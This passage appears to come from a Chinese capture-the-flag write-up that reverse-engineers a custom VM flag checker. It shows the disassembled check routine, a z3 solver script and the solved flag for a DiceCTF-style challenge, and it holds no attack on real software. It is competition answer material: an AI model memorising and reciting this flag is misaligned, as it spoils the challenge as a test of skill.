+<td style="text-align:center">栈顶上方两数相与</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">ex.pop</td>
+<td style="text-align:center">栈顶上方的数弹出到寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">ex.reset</td>
+<td style="text-align:center">设置栈指针为0x3008</td>
+</tr>
+</tbody>
+</table>
+<p>重新对flag检查部分进行分析：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">check_flag:
+</span></span><span class="line"><span class="cl">  mov r0, 0x0
+</span></span><span class="line"><span class="cl">  mov r8, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0xffffffffff
+</span></span><span class="line"><span class="cl">  and r8, r0
+</span></span><span class="line"><span class="cl">  mov r0, 0x7b65636964    ; &#39;dice{&#39;
+</span></span><span class="line"><span class="cl">  jeq r8, r0, deep_check       
+</span></span><span class="line"><span class="cl">  jmp check_end_false
+</span></span><span class="line"><span class="cl">deep_check:
+</span></span><span class="line"><span class="cl">  ex.reset
+</span></span><span class="line"><span class="cl">  mov r0, 0x7
+</span></span><span class="line"><span class="cl">  mov r8, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0x1
+</span></span><span class="line"><span class="cl">  mov r9, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0x11
+</span></span><span class="line"><span class="cl">  mov r10, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0xf
+</span></span><span class="line"><span class="cl">  mov r11, cs:[r0]
+</span></span><span class="line"><span class="cl">  ex.push r8
+</span></span><span class="line"><span class="cl">  ex.push r9
+</span></span><span class="line"><span class="cl">  ex.add
+</span></span><span class="line"><span class="cl">  ex.push 0x2c
+</span></span><span class="line"><span class="cl">  ex.add
+</span></span><span class="line"><span class="cl">  ex.push r10
+</span></span><span class="line"><span class="cl">  ex.push r11
+</span></span><span class="line"><span class="cl">  ex.add
+</span></span><span class="line"><span class="cl">  ex.push 0xd8
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push 0x10
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push 0xd6
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.eqz
+</span></span><span class="line"><span class="cl">  mov r0, 0x1
+</span></span><span class="line"><span class="cl">  mov r8, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0x5
+</span></span><span class="line"><span class="cl">  mov r9, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0xd
+</span></span><span class="line"><span class="cl">  mov r10, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0xe
+</span></span><span class="line"><span class="cl">  mov r11, cs:[r0]
+</span></span><span class="line"><span class="cl">  ex.push r8
+</span></span><span class="line"><span class="cl">  ex.push r9
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push 0xd6
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push r10
+</span></span><span class="line"><span class="cl">  ex.push r11
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push 0x70
+</span></span><span class="line"><span class="cl">  ex.add
+</span></span><span class="line"><span class="cl">  ex.add
+</span></span><span class="line"><span class="cl">  ex.push 0xe5
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push 0xa6
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.eqz
+</span></span><span class="line"><span class="cl">  ; ...
+</span></span><span class="line"><span class="cl">  mov r0, 0x24
+</span></span><span class="line"><span class="cl">  mov r8, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0x18
+</span></span><span class="line"><span class="cl">  mov r9, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0xe
+</span></span><span class="line"><span class="cl">  mov r10, cs:[r0]
+</span></span><span class="line"><span class="cl">  mov r0, 0x1a
+</span></span><span class="line"><span class="cl">  mov r11, cs:[r0]
+</span></span><span class="line"><span class="cl">  ex.push r8
+</span></span><span class="line"><span class="cl">  ex.push r9
+</span></span><span class="line"><span class="cl">  ex.add
+</span></span><span class="line"><span class="cl">  ex.push 0xc5
+</span></span><span class="line"><span class="cl">  ex.mul
+</span></span><span class="line"><span class="cl">  ex.push r10
+</span></span><span class="line"><span class="cl">  ex.push r11
+</span></span><span class="line"><span class="cl">  ex.mul
+</span></span><span class="line"><span class="cl">  ex.push 0x4d
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.push 0xfd
+</span></span><span class="line"><span class="cl">  ex.mul
+</span></span><span class="line"><span class="cl">  ex.push 0x95
+</span></span><span class="line"><span class="cl">  ex.xor
+</span></span><span class="line"><span class="cl">  ex.eqz
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.and
+</span></span><span class="line"><span class="cl">  ex.pop r8
+</span></span><span class="line"><span class="cl">  jmp check_end
+</span></span><span class="line"><span class="cl">check_end_false:
+</span></span><span class="line"><span class="cl">  mov r8, 0x0
+</span></span><span class="line"><span class="cl">check_end:
+</span></span><span class="line"><span class="cl">  ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输入的开始为“dice{”后会进入deep_check，每次从我们的输入中取出4字节进行处理，共处理了79组，每段最后都会异或一个立即数，并判断当前的栈顶是否为0。最后将这79组的结果相与放入R8，即返回给父进程。正确的flag是要让这79次处理的结果都为0，让eqz返回1。</p>
+<h3 id="z3-slover" class="headerLink">
+    <a href="#z3-slover" class="header-mark"></a>z3-slover</h3><p>根据这79个约束可以使用z3来快速求解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_op</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;add&#34;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;+&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;mul&#34;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;*&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;xor&#34;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;^&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;and&#34;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&amp;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_imm</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">slov</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x24</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;x</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&#34;d&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&#34;i&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&#34;c&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&#34;e&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mh">0x24</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">79</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">r8</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>         
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">r9</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">r10</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">r11</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;r8: {}, r9: {}, r10: {}, r11: {}&#34;.format(r8, r9, r10, r11))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op1</span> <span class="o">=</span> <span class="n">get_op</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">imm1</span> <span class="o">=</span> <span class="n">get_imm</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op2</span> <span class="o">=</span> <span class="n">get_op</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op3</span> <span class="o">=</span> <span class="n">get_op</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">imm2</span> <span class="o">=</span> <span class="n">get_imm</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op4</span> <span class="o">=</span> <span class="n">get_op</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">op5</span> <span class="o">=</span> <span class="n">get_op</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">imm3</span> <span class="o">=</span> <span class="n">get_imm</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op6</span> <span class="o">=</span> <span class="n">get_op</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">imm4</span> <span class="o">=</span> <span class="n">get_imm</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span> <span class="c1"># eqz</span>
+</span></span><span class="line"><span class="cl">    <span class="n">eq</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;((((flag[</span><span class="si">{</span><span class="n">r8</span><span class="si">}</span><span class="s1">] </span><span class="si">{</span><span class="n">op1</span><span class="si">}</span><span class="s1"> flag[</span><span class="si">{</span><span class="n">r9</span><span class="si">}</span><span class="s1">]) </span><span class="si">{</span><span class="n">op2</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">imm1</span><span class="si">}</span><span class="s1">) </span><span class="si">{</span><span class="n">op5</span><span class="si">}</span><span class="s1"> ((flag[</span><span class="si">{</span><span class="n">r10</span><span class="si">}</span><span class="s1">] </span><span class="si">{</span><span class="n">op3</span><span class="si">}</span><span class="s1"> flag[</span><span class="si">{</span><span class="n">r11</span><span class="si">}</span><span class="s1">]) </span><span class="si">{</span><span class="n">op4</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">imm2</span><span class="si">}</span><span class="s1">)) </span><span class="si">{</span><span class="n">op6</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">imm3</span><span class="si">}</span><span class="s1">) == </span><span class="si">{</span><span class="n">imm4</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(eq)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">slov</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">eq</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">slov</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">slov</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">str</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">]</span><span class="o">*</span><span class="mh">0x30</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">name</span><span class="p">()[</span><span class="mi">1</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">str</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] No result&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dice{st4ying_ins1de_vms_1s_0verr4ted}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
